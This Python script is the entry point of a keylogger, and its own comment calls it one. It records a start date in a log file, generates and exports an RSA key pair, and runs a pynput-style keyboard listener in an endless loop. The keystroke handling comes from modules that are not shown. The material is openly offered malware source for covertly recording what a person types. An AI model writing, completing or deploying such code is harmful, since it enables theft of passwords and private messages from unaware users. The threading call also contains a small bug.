import threading
from listener import *
from datetime import date
from encryptionsys import *

def join():
    appListener()
    with open(fileName, "a") as f:
        dataToday = date.today()  # date of everytime keylogger is open
        f.write(str(dataToday) + "\n")
        f.close()

    key = RSA.generate(2048)
    public_key = key.publickey()
    private_key = key

    exportPublicKey("public_key.pem", public_key)
    exportPrivateKey("private_key.pem", private_key)

    # read public and private key


    # print(ciphertext)
    # print(decypted_text)

    with Listener(on_press=on_press) as ls:
        while True:
            ls.join()

if __name__ == "__main__":
    try:
        threading.Thread(target=join()).start()
    except Exception as e:
        print(e)
